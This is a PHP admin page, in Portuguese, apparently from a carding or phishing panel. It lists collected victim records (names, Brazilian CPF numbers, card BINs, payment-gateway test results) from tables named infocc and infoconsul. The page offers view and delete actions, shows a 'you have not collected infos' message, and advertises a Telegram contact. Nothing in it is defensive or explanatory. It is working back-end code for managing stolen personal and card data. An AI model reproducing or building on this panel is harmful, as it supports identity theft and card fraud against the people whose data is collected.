<?php
   session_start();
   ini_set('display_errors', 1);
   ini_set('display_startup_errors', 1);
   error_reporting(E_ALL);
   require_once 'config.php';
   
   if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
       header("Location: ./");
       exit;
   }
   
   if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['tipo'], $_POST['id'])) {
       $tipo = $_POST['tipo'];
       $id = (int) $_POST['id'];
   
       if ($tipo === 'delcc') {
           $stmt = $conn->prepare("DELETE FROM infocc WHERE id = ?");
           $stmt->bind_param("i", $id);
   
           if ($stmt->execute()) {
              echo '
               <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet"/>
               <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
               <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
               <script>
                   $(function() {
                       toastr.options.timeOut = false;
                       toastr.options.closeButton = true;
                       toastr.options.positionClass = "toast-top-right";
                       toastr.success("Info deletado com sucesso!");
                       setTimeout(function() {
                           window.location.href = "?COMON=/ADMIN&acesso=InfosCC";
                       }, 1200);
                   });
               </script>';
           } else {
               echo "Erro ao excluir o info.";
           }
   
           $stmt->close();
       }
   }
   
   //$sql = "SELECT id, numero_pedido, nome, cpf, bin, resultado_gateway FROM infoconsul WHERE senha IS NULL OR senha = '' ORDER BY id DESC"; // e add logica para ele mostrar da tabela infocc tbm
   $sql = "SELECT id, numero_pedido, nome, cpf, bin, resultado_gateway FROM infoconsul WHERE senha IS NULL OR senha = '' UNION ALL SELECT c.id, c.numero_pedido, c.nome, c.cpf, c.bin, c.resultado_gateway FROM infocc c WHERE NOT EXISTS (SELECT 1 FROM infoconsul i WHERE i.numero_pedido = c.numero_pedido AND i.infocc = c.infocc) ORDER BY id DESC";
   $result = $conn->query($sql);
   
   ?>
<!doctype html>
<html lang="pt-br" data-theme="dark">
   <?php include('head.php'); ?>
   <body data-theme="light">
      <div id="body" class="theme-cyan">
      <?php include('theme.php'); ?>
      <div class="overlay"></div>
      <div id="wrapper">
      <?php include('submenu.php'); ?>
      <?php include('menu.php'); ?>
      <div id="main-content">
      <div class="container-fluid">
         <div class="block-header">
            <div class="row clearfix">
               <div class="col-lg-4 col-md-12 col-sm-12">
                  <h1>Olá  admin, você está em  / InfosCC</h1>
                  <span>TXT_JPGI1 - @TXT_JPGI1 <== no telegram!  </span>
               </div>
            </div>
         </div>
         <div class="col-lg-12">
            <div class="card">
               <div class="header">
                  <h2>Infos Full</h2>
               </div>
               <div class="body">
                  <div class="table-responsive">
                     <table class="table table-striped table-hover dataTable js-exportable">
                        <thead>
                           <tr>
                              <th>Gerenciar</th>
                              <th>PEDIDO</th>
                              <th>Nome</th>
                              <th>CPF</th>
                              <th>BIN</th>
                              <th>SITUAÇÃO</th>
                              <th class="d-none">INFO</th>
                           </tr>
                        </thead>
                        <tfoot>
                           <tr>
                              <th>Gerenciar</th>
                              <th>PEDIDO</th>
                              <th>Nome</th>
                              <th>CPF</th>
                              <th>BIN</th>
                              <th>SITUAÇÃO</th>
                              <th class="d-none">INFO</th>
                           </tr>
                        </tfoot>
                        <tbody>
                           <?php
                              $temResultados = false;
                              
                              if ($result && $result->num_rows > 0):
                                  while($cc = $result->fetch_assoc()):
                                      $temResultados = true;
                              ?>
                           <tr>
                              <td class="sorting_1"><button type="button" onclick="location.href='?COMON=/ADMIN&acesso=ViewInfocc&id=<?= $cc['id'] ?>';" class="btn btn-sm btn-default" title="Visualizar"><i class="fa fa-eye"></i></button>
                                 <form method="post" action="" style="display:inline;">
                                    <input type="hidden" name="tipo" value="delcc">
                                    <input type="hidden" name="id" value="<?= $cc['id'] ?>">
                                    <button type="submit" class="btn btn-sm btn-default" title="Deletar">
                                    <i class="fa fa-trash"></i>
                                    </button>
                                 </form>
                              </td>
                              <td><?= htmlspecialchars($cc['numero_pedido']) ?></td>
                              <td><?= htmlspecialchars($cc['nome']) ?></td>
                              <td><?= htmlspecialchars($cc['cpf']) ?></td>
                              <td><?= htmlspecialchars($cc['bin'] ?? '') ?></td>
                              <td><?= htmlspecialchars($cc['resultado_gateway'] ?? 'Não Testado') ?></td>
                              <td class="d-none"><?= htmlspecialchars(json_encode($cc)) ?></td>
                           </tr>
                           <?php
                              endwhile;
                              endif;
                              
                              if (!$temResultados):
                              ?>
                           <script>
                              $(function() {
                                  toastr.options.timeOut = false;
                                  toastr.options.closeButton = true;
                                  toastr.options.positionClass = 'toast-top-right';
                                  toastr['info']('Você não coletou infos!');
                              });
                           </script>
                           <?php endif; ?>
                        </tbody>
                     </table>
                  </div>
               </div>
            </div>
         </div>
      </div>